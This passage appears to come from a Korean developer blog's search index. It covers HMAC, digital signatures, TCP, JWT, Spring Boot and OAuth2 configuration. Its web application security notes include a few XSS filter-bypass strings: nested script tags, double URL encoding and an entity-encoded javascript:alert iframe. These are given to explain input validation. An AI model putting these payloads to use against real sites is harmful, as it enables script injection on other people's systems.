block size} \\\\ K &amp;\\text{otherwise} \\end{cases}K′={H(K)K​K is larger than block sizeotherwise​ HMAC의 순서 키 패딩 : 일방향 해시 함수 블록 길이 패딩한 키와 ipad (Inner Padding)의 XOR 메시지 결합 해시 값의 계산 패딩한 키와 opad(Outer Padding)의 XOR 해시 값과의 결합 해시 값의 계산 Replay 공격 Replay 공격 방어 순서 번호 (Sequence number) : 송신 메세지에 매회 1씩 증가하는 번호 (순서 번호, Sequence number) 마지막 통신시 순서 번호를 저장 TimeStamp 송신 메세지에 현재 시각 넣기 송수신자 사이의 동기화 필요 비표(Nonce) 송신자에게 일회용의 랜덤한 값을 전송 메시지와 비표를 합해 MAC 값을 계산 비표 값은 통신 마다 교체 키 추측 공격 Brute Force Birthday Attack MAC 값만 획득한 공격자가 키를 추측하지 못하도록 해야 한다 해시 함수의 일방향성 해시 함수의 충돌내성 키 생성에 의사난수 생성기 사용","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[{"name":"pki","slug":"pki","permalink":"https://blog.devkwang.app/tags/pki/"}]},{"title":"spring-boot-application-argument","slug":"spring-boot-application-argument","date":"2020-04-07T00:24:01.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/07/spring-boot-application-argument/","link":"","permalink":"https://blog.devkwang.app/2020/04/07/spring-boot-application-argument/","excerpt":"","text":"Spring boot 실행할 때 args 를 전달받기 위한 Interface. Spring boot에서 org.springframework.boot.ApplicationArguments 를 제공하고 있어서 Bean으로 받아서 사용하면 간단하게 쓸 수 있습니다. Spring boot에서 아무런 설정을 하지 않는다면 DefaultApplicationArguments를 사용해 처리한다. getSourceArgs 입력한 args 그대로 배열로 받아 옵니다. getOptionNames args 앞에 “–” 를 붙이면 옵션으로 인식 합니다. 옵션 args 사용 형식 --NAME=VALUE “–fruit=apple” 이렇게 args를 사용하면 getOptionName는 fruit 처럼 option name 들의 배열을 받아 옵니다. getNonOptionArgs “–” 가 없는 경우 NonOption으로 인식합니다. “–” 가 없는 args 들의 값들을 받다 옵니다. 123456789private final Source source;private final String[] args;public DefaultApplicationArguments(String[] args) &#123; Assert.notNull(args, \"Args must not be null\"); this.source = new Source(args); this.args = args;&#125; 내부에 private final로 선언되어 있어 생성자를 통한 할당이 아니라면 바꿀수가 없다. 또한 Source라고 하는 내부 Class를 가지고 있고, 이는 SimpleCommandLinePropertySource를 상속해 구현하였다. 1234567891011121314151617private static class Source extends SimpleCommandLinePropertySource &#123; Source(String[] args) &#123; super(args); &#125; @Override public List&lt;String&gt; getNonOptionArgs() &#123; return super.getNonOptionArgs(); &#125; @Override public List&lt;String&gt; getOptionValues(String name) &#123; return super.getOptionValues(name); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class SimpleCommandLinePropertySource extends CommandLinePropertySource&lt;CommandLineArgs&gt; &#123; /** * Create a new &#123;@code SimpleCommandLinePropertySource&#125; having the default name * and backed by the given &#123;@code String[]&#125; of command line arguments. * @see CommandLinePropertySource#COMMAND_LINE_PROPERTY_SOURCE_NAME * @see CommandLinePropertySource#CommandLinePropertySource(Object) */ public SimpleCommandLinePropertySource(String... args) &#123; super(new SimpleCommandLineArgsParser().parse(args)); &#125; /** * Create a new &#123;@code SimpleCommandLinePropertySource&#125; having the given name * and backed by the given &#123;@code String[]&#125; of command line arguments. */ public SimpleCommandLinePropertySource(String name, String[] args) &#123; super(name, new SimpleCommandLineArgsParser().parse(args)); &#125; /** * Get the property names for the option arguments. */ @Override public String[] getPropertyNames() &#123; return StringUtils.toStringArray(this.source.getOptionNames()); &#125; @Override protected boolean containsOption(String name) &#123; return this.source.containsOption(name); &#125; @Override @Nullable protected List&lt;String&gt; getOptionValues(String name) &#123; return this.source.getOptionValues(name); &#125; @Override protected List&lt;String&gt; getNonOptionArgs() &#123; return this.source.getNonOptionArgs(); &#125;&#125; SimpleCommandLinePropertySource는 CommandLineArgs를 Source를 가지는 CommandLinePropertySource를 상속해 구현하였고, CommandLineArgs는 내부에 HashMap으로 Option Argument들을, List로 nonOptionArgs를 가지고 있는 Source로 관리된다.","categories":[{"name":"Java","slug":"Java","permalink":"https://blog.devkwang.app/categories/Java/"},{"name":"Spring","slug":"Java/Spring","permalink":"https://blog.devkwang.app/categories/Java/Spring/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.devkwang.app/tags/java/"},{"name":"spring","slug":"spring","permalink":"https://blog.devkwang.app/tags/spring/"}]},{"title":"cryptography-signatures","slug":"cryptography-signatures","date":"2020-04-07T00:23:21.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/07/cryptography-signatures/","link":"","permalink":"https://blog.devkwang.app/2020/04/07/cryptography-signatures/","excerpt":"","text":"Signatures Electronic Signature 계약 또는 기타 기록에 첨부된 서명으로 서명하려는 사람이 실행하거나 채택한 전자 신호,심볼 또는 프로세스로 정의 된다. 기본적으로 전자 서명은 손으로 쓴 서명을 디지털화 한 것과 동일하며 문서 내의 내용 또는 특정 문서의 용어를 확인하는 데 사용할 수 있다. Digital Signature 문서에 서명 한 사람이 본인이 맞는가? 서명이 유효하고 위조되지 않았는지 어떻게 확인할 수 있는가? 문서가 변경되지 않았는지 어떻게 확인할 수 있을까? Digital Signature의 경우 Certification Authority(CA)으로 알려진 신뢰할 수 있는 제 3자가 신원 확인 측면에서 공증인 역할을 한다. 인증 기관은 신원을 PKI (Public Key Infrastructure) 기반 디지털 인증서에 바인딩해서 문서 및 클라우드 기반 서명 플랫폼에 디지털 서명을 적용 할 수 있다. 보장 범위 문서는 정통이며 검증된 출처에서 제공된다. 서명이 변경되면 서명이 유효하지 않은 것으로 표시되어 디지털 서명 된 이후 문서가 변경되지 않았다. 사용자의 신원이 신뢰할 수 있는 조직에 의해 확인되었다. Certified Signature Approval Signature Signature Line PKI (Public Key Infrastructure) RFC 2459 : Internet X.509 Public Key Infrastructure Message Digest (Hash Function) Symmetric Key Algorithm Asymmetric Key Algorithm Cryptographic Hash Function Message Digest MD5(128bit), SHA-1(160bit) Symmetric Key Algorithm One key (대칭키) Encryption, Decryption 3DES, AES Asymmetric Key Algorithm Two Key (비 대칭키) RSA (Rivest, Shmir, Adelman) 공개키 : 평문을 공개키로 암호화한후 개인키로 복호화해 Encrypted Text를 만든다. 개인키 : 개인키로 암호화한 후 공개키로 복호화해 Encrypted Text를 만든다. 개인이 보낸 내용을 증명할 때 많이 사용하며 이러한 경우를 개인키 ‘전자서명’, 공개키 ‘서명검증’ 이라고 한다. 서명 작성과 서명 검증 메시지의 서명을 작성하는 행위 디지털 서명에는 서명용 키와 검증용 키가 나누어져 있다. 서명용 키는 서명을 하는 사람이 가지고 있지만, 검증용 키는 서명을 검증하는 사람이라면 누구라도 가질 수 있다. 공개키 암호와 디지털 서명 공개 키 암호 암호화키와 복호화키가 나누어져 있어 암호키로 복호화를 행할 수는 없다. 복호화 키는 복호화를 행하는 사람만이 가지고 있지만 암호키는 암호화를 행하는 사람이라면 누구나 가질 수 있다. 디지털 서명은 공개 키 암호를 역으로 사용함으로써 실현한다. 개인키 공개키 공개키 암호 수신자가 복호화에 사용 송신자들이 암호화에 사용 디지털 서명 서명자가 서명 작성에 사용 검증자들이 서명 검증에 사용 키는 누가 갖는가? 개인이 갖는다 필요한 사람은 아무나 가지고 있어도 된다. 메세지를 개인키로 암호화 하는 것이 서명 작성 암호문을 공개키로 복호화 하는 것이 서명 검증 공개키 암호는 누구라도 암호화 디지털 서명은 누구라도 서명검증 참조 : https://crazia.tistory.com/entry/PKI-PKI-의-기본-개념-간단-설명","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[{"name":"pki","slug":"pki","permalink":"https://blog.devkwang.app/tags/pki/"}]},{"title":"network-tcp-congestion-control","slug":"network-tcp-congestion-control","date":"2020-04-07T00:11:32.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/07/network-tcp-congestion-control/","link":"","permalink":"https://blog.devkwang.app/2020/04/07/network-tcp-congestion-control/","excerpt":"","text":"Congestion Control (혼잡 제어) TCP Fast Retransmit 송신측에서 Duplicate ACK를 받게 되면 패킷 손실로 간주하고 즉시 재전송 Fast Retransmit 미사용 시 손실 발생 시 재전송 Timeout 만료 후 재전송 재전송 타이머 값이 종종 상대적으로 길어지므로, 손실된 패킷의 재전송 전에 지연시간이 커진다. 위의 상항을 해결하고자 중복 ACKs를 통해 손실된 세그먼트를 검출한다. 송신측에서 바로바로 여러 개의 세그먼트를 전송할 경우, 세그먼트가 손실되면 수신측에서는 중복 ACK를 보내게 되는데, 타임아웃 전에 송신측에서 중복 ACK를 3번받게 되면 세그먼트를 즉시 전송한다. 즉, 수신측이 기다리는 순서번호의 세그먼트보다 큰 순서번호의 세그먼트가 3개 도착할 경우를 의미한다.","categories":[{"name":"Network","slug":"Network","permalink":"https://blog.devkwang.app/categories/Network/"},{"name":"TCP","slug":"Network/TCP","permalink":"https://blog.devkwang.app/categories/Network/TCP/"}],"tags":[{"name":"tcp","slug":"tcp","permalink":"https://blog.devkwang.app/tags/tcp/"}]},{"title":"network-tcp-basic","slug":"network-tcp-basic","date":"2020-04-06T23:49:59.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/07/network-tcp-basic/","link":"","permalink":"https://blog.devkwang.app/2020/04/07/network-tcp-basic/","excerpt":"","text":"TCP Overview 점대점(Point-to-Point) : 단일 송/수신자간의 통신 ex) 일대일 통신, Unicast 전송 Unicast : 고유 주소로 식별된 하나의 네트워크 목적지에 메시지를 전송하는 방식 Broadcast : 송신 가능한 모든 목적지에 동일한 데이터를 전송 Multicast : 특별한 주소 지정 방식을 통해 정해진 여러 목적지로 데이터를 전송 호스트가 무수히 많은 경우, Unicast로 데이터를 전송하면, 각각의 네트워크 연결마다 호스트의 컴퓨팅 리소스(자원)을 소비할 뿐 아니라 각각 다른 네트워크 대역폭을 필요로 하기 때문에 전송 비용이 많이 든다는 단점이 있다. 파이프라인(Pipeline) : TCP의 혼잡 제어 및 흐름 제어가 윈도우 크기(Window size)를 결정한다. Window size : ACK받지 않은 데이터 중 최대 송신가능한 바이트 수, 수신자가 한 번에 버퍼링할 수 있는 최대 데이터 크기 Sliding Window : 두 개의 네트워크 호스트 간의 패킷의 흐름을 제어하기 위한 방법으로, TCP 프로토콜은 데이터의 전달을 보증해야 하므로 패킷 하나 하나가 정상적으로 전달되었음을 알리는 확인 신호(Acknowledgement, ACK)를 수신자가 송신자에게 보내야 한다. 패킷에 오류가 생겼을 경우, 송신측에서 해당 패킷을 재전송해야 하는데 이 때 Sliding Window가 Window Size(메모리 버퍼의 일정 영역)에 포함되는 모든 패킷을 전송하고, 패킷의 전달이 확인되는 대로 이 Window를 옆으로 옮김(Sliding)으로써 그 다음 패킷들을 전송할 준비를 한다. 전이중성 데이터(Full-duplex Data) : 같은 연결 상에서 양방향 데이터 흐름 최대 세그먼트 크기 (Maximum Segment Size, MSS) 헤더를 제외하고 TCP가 실을 수 있는 최대 데이터 크기 기본값은 IPv4 -&gt; 536 Byte, IPv6 -&gt; 1220 Byte이다. 최대 전송 단위(MTU)에 의해 값이 결정되며, MSS값은 헤더의 MSS 옵션 필드에 저장된다. 연결에 참여하는 두 장비가 서로 다른 MSS값을 갖을 수도 있다. 최대 전송 단위(Maximum Transmission Unit, MTU) 데이터 링크(2계층) 또는 네트워크(3계층)에서 하나의 프레임 또는 패킷에 담아 운반할 수 있는 헤더를 포함한 최대 데이터 크기 최소 권고값은 2계층 기준 1500Byte이며, 3계층 기준 IPv4는 MSS 크기에서 40byte(IP헤더+TCP헤더)를 추가한 576Byte이고, IPv6는 1280Byte이다. 실제로는 최대 65,646바이트 범위까지 생성가능하다. MTU가 IP 기반의 정보인 반면, Maximum Segment Size는 TCP 기반의 정보이다. TCP는 연결지향형으로 제어 메시지들의 교환(Handshaking)이 이루어진다. 핸드쉐이킹을 통해 데이터 교환 전에 송신자 및 수신자의 상태를 초기화한다. TCP Segment Source port number : 출발지 포트 번호 Destination port number : 도착지 포트 번호 Sequence number : 순서번호(Seq#)로, 세그먼트에서 첫 번째 바이트의 바이트 스트림 번호값이 저장된다. Response number : 확인응답(누적된 ACK)번호로, 상대방으로부터 받아야할 다음 바이트의 순서번호값이 저장된다. Header length : 헤더의 길이로, Option이 없으면 헤더값에 5개의 비트값이 들어간다. 그러나 일반적으로 32비트이다. Reservation : 나중에 다시 설명 Control flag Window : 수신측의 윈도우 크기(Window size)로, 받을 수 있는 최대 데이터 크기값이 저장되어 있다. TCP Checksum :체크섬값이란 세그먼트의 합에 1의 보수를 취한 값을 말하며, 수신측에서 체크섬과 세그먼트의 실제 데이터를 더한 결과를 통해 오류를 검출한다. Emergency Data point : 생략 Option : 변수의 길이로 설명은 생략. Data : 헤더를 제외한 실제 세그먼트에 들어있는 데이터의 크기로 MSS에 의해 제한되어진다. FLAG 순서 구체적으로 flag순서는 URG, PSH, RST, SYN, FIN이고 각각 1비트로 표현되는 값이 저장된다. 각각 1비트로 TCP 세그먼트 필드 안에 cONTROL BIT 또는 FLAG BIT 로 정의 되어 있다. ±------±------±-----±------±------±-----+ | URG | ACK | PSH | RST | SYN | FIN | ±------±------±-----±------±------±-----+ SYN(Synchronization:동기화) - S : 연결 요청 플래그 TCP 에서 세션을 성립할 때 가장먼저 보내는 패킷, 시퀀스 번호를 임의적으로 설정하여 세션을 연결하는 데에 사용되며 초기에 시퀀스 번호를 보내게 된다. ACK(Acknowledgement) - Ack : 응답 상대방으로부터 패킷을 받았다는 걸 알려주는 패킷, 다른 플래그와 같이 출력되는 경우도 있습니다. 받는 사람이 보낸 사람 시퀀스 번호에 TCP 계층에서 길이 또는 데이터 양을 더한 것과 같은 ACK를 보냅니다.(일반적으로 +1 하여 보냄) ACK 응답을 통해 보낸 패킷에 대한 성공, 실패를 판단하여 재전송 하거나 다음 패킷을 전송한다. RST(Reset) - R : 제 연결 종료 재설정(Reset)을 하는 과정이며 양방향에서 동시에 일어나는 중단 작업이다. 비 정상적인 세션 연결 끊기에 해당한다. 이 패킷을 보내는 곳이 현재 접속하고 있는 곳과 즉시 연결을 끊고자 할 때 사용한다. PSH(Push) - P : 밀어넣기 TELNET 과 같은 상호작용이 중요한 프로토콜의 경우 빠른 응답이 중요한데, 이 때 받은 데이터를 즉시 목적지인 OSI 7 Layer 의 Application 계층으로 전송하도록 하는 FLAG. 대화형 트랙픽에 사용되는 것으로 버퍼가 채워지기를 기다리지 않고 데이터를 전달한다. 데이터는 버퍼링 없이 바로 위 계층이 아닌 7 계층의 응용프로그램으로 바로 전달한다. URG(Urgent) - U : 긴급 데이터 Urgent pointer 유효한 것인지를 나타낸다. Urgent pointer란 전송하는 데이터 중에서 긴급히 전당해야 할 내용이 있을 경우에 사용한다. 긴급한 데이터는 다른 데이터에 비해 우선순위가 높아야 한다. EX) ping 명령어 실행 도중 Ctrl+c 입력 FIN(Finish) - F : 연결 종료 요청 세션 연결을 종료시킬 때 사용되며 더이상 전송할 데이터가 없음을 나타낸다. Placeholder 패킷의 플래그에 SYN, FINISH, RESET, PUSH등의 플래그가 설정 되어 있지 않은 경우 이 플래그가 세팅된다. 이 플래그는 ACK플래그와 함께 사용되는 경우도 있다. TCP Round Trip Time, Timeout TCP는 신뢰적인 데이터 전송(RDT)처럼 세그먼트의 손실을 발견하기 위해 타임아웃/재전송 메커니즘을 사용한다. 이 때, 송신측에서 데이터를 전송한 후, ACK받기까지 걸린 시간을 RTT(Rount Trip Time)이라 표현한다. 타임아웃(timeout) 주기는 RTT보다 길어야 한다. 너무 짧으면 타임아웃이 자주 발생하여 세그먼트의 불필요한 재전송이 발생하므로 링크를 비효율적으로 사용하게 된다. 반대로 너무 길게 되면, 세그먼트의 손실에 대한 느린 대응으로 회복이 비효율적이게 된다. SampleRTT : 세그먼트가 송신된 시간부터 ACK 받기까지 측정된 시간으로, 재전송한 세그먼트는 무시한다. 값은 네트워크 부하에 따라 가변적이다. 현재 SampleRTT 값이 아닌 최근의 값들의 평균값으로 추정한다. 추정RTT : EstimatedRTT = (1-a) * EstimatedRTT + a * SampleRTT 일반적으로 a=0.125이고, 지수적 가중 이동 평균(EWMA)방식으로 과거 샘플들의 영향이 지수적으로 감소한다. a가 높을수록 SampleRTT에 더 영향을 준다. DevRTT : RTT 변화율로, SampleRTT와 EstimatedRTT의 편차값이다. 즉, 현재 RTT값이 추정 RTT값으로부터 얼마나 벗어났는가에 대한 정보이다. 재전송 타임아웃 주기 (Timeout Interval) = EstimatedRTT + 4 * DevRTT 타임아웃나서 세그먼트를 재전송하게 되면, 재전송한 세그먼트에 대한 타이머가 시작된다. TCP의 RDT TCP는 비신뢰적인 인터넷 네트워크 계층(IP서비스)의 상위 계층에서 신뢰적인 데이터 전달(Reliable Data Transfer, RDT) 서비스를 제공한다. 파이프라인되는 세그먼트 (ACK의 응답이 없어도 다수의 세그먼트를 전송가능) 누적된 ACKs 단 하나의 재전송 타이머 재전송은 타임아웃이 되거나, 중복 ACKs를 수신했을 경우 발생한다. “간소화된 TCP 송신자”는 중복 ACKs를 무시하고 흐름제어 및 혼잡제어를 무시한다. TCP 송신자의 3가지 상황(Sender Events) 상위 계층으로부터 수신된 데이터 : 데이터를 받았으므로 상위 계층으로부터 데이터 전송 요청이 오게 된다. 순서번호(Seq#)를 가진 세그먼트 생성 (Seq# : 세그먼트의 첫 번째 바이트의 바이트 스트림 번호) 타이머가 실행되지 않고 있으면 타이머를 시작한다. 타이머의 만료주기는 Timout Interval 로 계산한다. 타임아웃 : 타임아웃에 의해 세그먼트가 재전송되고, 전송했으나 ACK 받지 않은 가장 오래된 세그먼트에 대해 타이머가 다시 시작한다. ACK를 수신한 경우 : 이전에 ACK받지 않은 세그먼트의 ACK 이면, 해당 세그먼트를 ACK 응답된 세그먼트로 표시한다. 즉, 윈도우 크기를 조정한다. 아직 ACK받지 못한 세그먼트들이 존재한다면 타이머를 시작한다.","categories":[{"name":"Network","slug":"Network","permalink":"https://blog.devkwang.app/categories/Network/"},{"name":"TCP","slug":"Network/TCP","permalink":"https://blog.devkwang.app/categories/Network/TCP/"}],"tags":[{"name":"tcp","slug":"tcp","permalink":"https://blog.devkwang.app/tags/tcp/"}]},{"title":"spring-security-jose","slug":"spring-security-jose","date":"2020-03-31T06:42:00.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2020/03/31/spring-security-jose/","link":"","permalink":"https://blog.devkwang.app/2020/03/31/spring-security-jose/","excerpt":"","text":"JOSE (Javascript Object Signing and Encryption) https://jose.readthedocs.io/en/latest/ JWT (JSON WEB Token) : JWS or JWE JWS (JSON Web Signature) : 서버에서 인증을 증거로 인증 정보를 서버의 Private Key 로 서명 JWE (Json Web Encryption) : 서버와 클라이언트 간 암호화된 데이터를 Token 화 한것 JWK (Json Web Key) : cryptographic key 표현 형식 JWT Base64URL Encode Header 1234&#123; \"typ\": \"JWT\", \"alg\": \"HS256\"&#125; Payload Claim : 정보의 조각을 뜻함 Key/Value 의 쌍으로 구성 Registerd, public, private 의 type을 가짐 Registered Claim iss : 토근 발급자 (issuer) sub : 토큰 제목 (subject) aud : 토큰 대상자 (audience) exp : 토큰의 만료시간 (expiration) nbf : 토큰의 활성날짜 (Not Before) nbf 이후 토큰이 활성화 되어야 함. 그전까지 처리 안됨 iat : 토큰이 발급된 시간 (issued at) token age 판단 가능 jti : JWT 고유 식별자. 중복확인때 사용됨 Public Claim 충돌 방지된 이름 (collision-resistant) Claim 이름을 URI 형식으로 설정함 123&#123; \"https://your.domain/jwt_claims/\": true&#125; Private Claim 클라이언트 서버 양측간 협의하에 사용되는 클레임 이름 123&#123; \"username\": \"yours\"&#125; Signature Header의 인코딩 값, Payload의 인코딩 값 을 합치고 Private Key로 해쉬를 하여 생성 1234HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)","categories":[],"tags":[]},{"title":"security-webapplicationhacker-1","slug":"security-webapplicationhacker-1","date":"2020-03-31T01:00:11.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/03/31/security-webapplicationhacker-1/","link":"","permalink":"https://blog.devkwang.app/2020/03/31/security-webapplicationhacker-1/","excerpt":"","text":"핵심 방어 매커니즘 권한이 없는 사용자가 민감한 정보에 접근하는 것을 막기 위해 어플리케이션의 데이터와 기능에 대한 사용자 접근 처리 의도하지 않은 행동을 유발시키는 사용자 입력을 막기 위해 어플리케이션의 기능에 대한 사용자 입력 값 처리 어플리케이션이 공격자로부터 직접적인 공격 대상이 됐을 때 이를 방어하고 보안 수준을 높이기 위한 공격자에 대한 처리 어플리케이션에 대해 실시간으로 모니터링 할 수 있는 기능을 관리자에게 제공함으로써 관리자가 안전하게 어플리케이션을 관리할 수 있게 함 사용자 접근 처리 사용자 범주 익명 사용자(anonymous users), 인가된 사용자(ordinary authenticated users), 관리적 사용자 (administrative users) 인증 ID/PWD, 클라이언트 인증, 스마트카드, Access Token 공격자가 다른 사용자의 아이디와 비밀번호를 추측하거나 로직에 있는 결함을 악용함으로써 인증 과정을 우회할 가능성이 있다. 세션 관리 모든 어플리케이션은 각 사용자를 위한 세션을 만들어 주거나 사용자에게 세션을 확인하게 하는 토큰을 발행한다. 세션 자체는 서버에 할당돼 있는 데이터 집합의 구조이며, 어플리케이션과 사용자간의 상호 작용을 도와주는 데 사용된다. 토큰이란 어플리케이션이 세션에 나타내는 독특한 문자열을 말한다. 표준방법은 HTTP 쿠키를 사용한다. 일부 어플리케이션은 세션 토큰을 사용하지 않고 사용자를 재확인하는 다른 수단으로 클라이언트에 상태 정보를 저장해 두는데 누군가 엿들을 수 있는 위험을 막기 위해 암호화 된다. 접근 통제 사용자 접근 통제의 마지막 단계는 애 플리케이션 에서 사용자의 요청이 허가되는지 아닌지 결정을 내리고 실행하는 것이다. 사용자 입력 값 처리 입력 값 조작에 대한 처리 방법 위험하다고 알려진 것들은 모두 차단 안전하다고 알려진 용것들은 모두 수 불순물 제거 (Sanitization) 안전한 데이터 처리 의미론적 검증법 경계 검증 프로세스의 여러 딘계에서 경계 검증을 하는 애플리케이션 기능 다단계 검증과 정규화 Ex) Cross-Site-script 우회 1234&lt;script&gt;filter 우회&lt;scr&lt;script&gt;ipt&gt; 어플리케이션이 처음으로 …/를 제거한 후 인용부호를 떼어버린다면 다음의 입력 값은 검증을 실패로 만드는 데 사용될 수 있다. …/ URL Encoding filter 우회 %2527 -&gt; %27 %%2727 HTML 인코딩 filter 우회 1&lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29; &gt; 좋은 처리 방법은 입력 값의 한 부분이라도 수정이 인ㄹ어나지 않을 때까지 계속 재귀적으로 불안전한 문자를 안전한 상태로 만드는 불순물 제거(Sanitization) 작업을 수행하는 것이다. 공격자 핸들링 에러 핸들링 (Handling Errors) : 어플리케이션은 시스템 기반 메세지나 디버깅 정보를 노출시켜서는 안 된다. 감시 로그 관리 (Maintaining Audit Log) : 어플리케이션은 시스템 기반 메세지나 디버깅 정보를 노출시켜서는 안 된다. 로그인 성공, 로그인 실패, 비밀번호 변경과 같은 인증 기능과 관련된 모든 이벤트 신용카드 결제와 자금 이체 같은 주요 거래 접근 통제 메커니즘에 의해 막혀진 접근 시도 잘 알려진 공격 문자열을 포함하고 있는 악의적인 의도를 명확하게 표시하는 요청 관리자에게 경고 (Alerting Administrators) 하나의 IP 주소나 한 명의 사용자로부터 비정상적으로 많은 양의 요청을 받은 경우 하나의 은행 계좌로부터 평소와 다르게 많은 돈이 인출된 경우 잘 알려진 공격 문자열을 포함하는 경우 일반 사용자들에게 숨겨진 데이터가 수정된 경 공격 대응 (Reacting to attacks)우 공격자의 요청에 점차적으로 늦게 대응하 공격자의 세션을 종료시킴 어플리케이션 관리 인증 메커니즘에서 약점은 공격자가 전체 어플리케이션을 위험에 빠지게 할 수 있는 관리적인 접근 획득이 가능할 수 있다는 점이다. 다수의 어플리케이션이 관리자 기능에 효과적인 접근 통제를 수행하지 안흔ㄴ다. 공격자는 높은 권한을 가진 새로운 사용자 계정을 생성하는 방법을 찾아 낼지도 모른다. 관리자 기능은 가끔 사용자로부터 발생되는 데이터를 표현하는 사항에 대한 기능을 포함하기도 한다. 관리 인터페이스 내에 있는 크로스사이트 스크립팅 취약점은 높은 권한을 가진 세션을 위협할 수도 있다. 관리자 기능은 신뢰되는 사용자에 의해 사용된다고 생각하기 때문에 덜 엄격한 보안 검사를 받게 된다.","categories":[],"tags":[]},{"title":"java-class-clazz","slug":"java-class-clazz","date":"2020-03-30T00:50:55.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/03/30/java-class-clazz/","link":"","permalink":"https://blog.devkwang.app/2020/03/30/java-class-clazz/","excerpt":"","text":"간단하게 instanceof는 특정 Object가 어떤 클래스/인터페이스를 상속/구현했는지를 체크하며 Class.isAssignableFrom()은 특정 Class가 어떤 클래스/인터페이스를 상속/구현했는지 체크합니다. 12345678910// instanceofMacPro obj = new MacPro();if (obj instanceof Computer) &#123; ...&#125;// Class.isAssignableFrom()if (Computer.class.isAssignableFrom(MacPro.class)) &#123; ...&#125; 특정 클래스가 다른 인터페이스를 구현했거나 상속받았는지를 체크하기 위해서는 어떻게 하면 될까? 상위클래스들을 모조리(java.lang.Object 가 될때까지) 찾아다니면서 구현한 Interface들을 확인하면 될것도 같은데 왠지 세련되지 않은 것 같다. isAssignableFrom 이라는 메소드는 위 문제를 쉽게 해결해준다. 내가 원하는 것은 사용자로부터 입력받은 클래스가 java.util.Collection 인터페이스를 (implements)구현한 클래스인지 체크하는 것이었다.","categories":[],"tags":[]},{"title":"Spring-annotation","slug":"Spring-annotation","date":"2020-03-29T23:17:56.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/03/30/Spring-annotation/","link":"","permalink":"https://blog.devkwang.app/2020/03/30/Spring-annotation/","excerpt":"","text":"@ConfigurationProperties","categories":[],"tags":[]},{"title":"spring-security-oauth2","slug":"spring-security-oauth2","date":"2020-03-29T23:12:02.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2020/03/30/spring-security-oauth2/","link":"","permalink":"https://blog.devkwang.app/2020/03/30/spring-security-oauth2/","excerpt":"","text":"Spring-Security-oauth2 vs Spring Security Group ID Spring Security 안의 ArtifactID로 oauth2로 이관되면서 Group ID가 security-oauth2 였던 OSS가 Deprecated 되었다. 123456789101112131415161718192021222324252627282930spring: thymeleaf: cache: false security: oauth2: client: registration: messaging-client-auth-code: provider: keycloak client-id: messaging-client client-secret: secret authorization-grant-type: authorization_code redirect-uri: \"&#123;baseUrl&#125;/authorized\" scope: message.read,message.write messaging-client-client-creds: provider: keycloak client-id: messaging-client client-secret: secret authorization-grant-type: client_credentials scope: message.read,message.write messaging-client-password: provider: keycloak client-id: messaging-client client-secret: secret authorization-grant-type: password scope: message.read,message.write provider: keycloak: authorization-uri: http://localhost:8090/auth/realms/oauth2-sample/protocol/openid-connect/auth token-uri: http://localhost:8090/auth/realms/oauth2-sample/protocol/openid-connect/token ClientRegistration Oauth 2.0 or OpenID Connect 1.0 Provider 들에 등록된 Client의 정보들을 적게된다. client 정보에는 ID, Secret, authorization grant type, redirect URL… etc 123456789101112131415161718192021public final class ClientRegistration implements Serializable &#123; private static final long serialVersionUID = SpringSecurityCoreVersion.SERIAL_VERSION_UID; private String registrationId; private String clientId; private String clientSecret; private ClientAuthenticationMethod clientAuthenticationMethod = ClientAuthenticationMethod.BASIC; private AuthorizationGrantType authorizationGrantType; private String redirectUriTemplate; private Set&lt;String&gt; scopes = Collections.emptySet(); private ProviderDetails providerDetails = new ProviderDetails(); private String clientName; public class ProviderDetails implements Serializable &#123; private static final long serialVersionUID = SpringSecurityCoreVersion.SERIAL_VERSION_UID; private String authorizationUri; private String tokenUri; private UserInfoEndpoint userInfoEndpoint = new UserInfoEndpoint(); private String jwkSetUri; private Map&lt;String, Object&gt; configurationMetadata = Collections.emptyMap(); &#125;&#125; registrationId: The ID that uniquely identifies the ClientRegistration. clientId: The client identifier. clientSecret: The client secret. clientAuthenticationMethod: The method used to authenticate the Client with the Provider. The supported values are basic, post and none (public clients). authorizationGrantType: The OAuth 2.0 Authorization Framework defines four Authorization Grant types. The supported values are authorization_code, client_credentials and password. redirectUriTemplate: The client’s registered redirect URI that the Authorization Server redirects the end-user’s user-agent to after the end-user has authenticated and authorized access to the client. scopes: The scope(s) requested by the client during the Authorization Request flow, such as openid, email, or profile. clientName: A descriptive name used for the client. The name may be used in certain scenarios, such as when displaying the name of the client in the auto-generated login page. authorizationUri: The Authorization Endpoint URI for the Authorization Server. tokenUri: The Token Endpoint URI for the Authorization Server. jwkSetUri: The URI used to retrieve the JSON Web Key (JWK) Set from the Authorization Server, which contains the cryptographic key(s) used to verify the JSON Web Signature (JWS) of the ID Token and optionally the UserInfo Response. configurationMetadata: The OpenID Provider Configuration Information. This information will only be available if the Spring Boot 2.x property spring.security.oauth2.client.provider.[providerId].issuerUri is configured. (userInfoEndpoint)uri: The UserInfo Endpoint URI used to access the claims/attributes of the authenticated end-user. (userInfoEndpoint)authenticationMethod: The authentication method used when sending the access token to the UserInfo Endpoint. The supported values are header, form and query. userNameAttributeName: The name of the attribute returned in the UserInfo Response that references the Name or Identifier of the end-user. Endpoint 별 초기화 OpenID Connect Provider : configuration endpoint OAuth2.0 : Metadata endpoint ClientRegistrationRepository 123456789public final class InMemoryClientRegistrationRepository implements ClientRegistrationRepository, Iterable&lt;ClientRegistration&gt; &#123; private final Map&lt;String, ClientRegistration&gt; registrations; @Override public ClientRegistration findByRegistrationId(String registrationId) &#123; 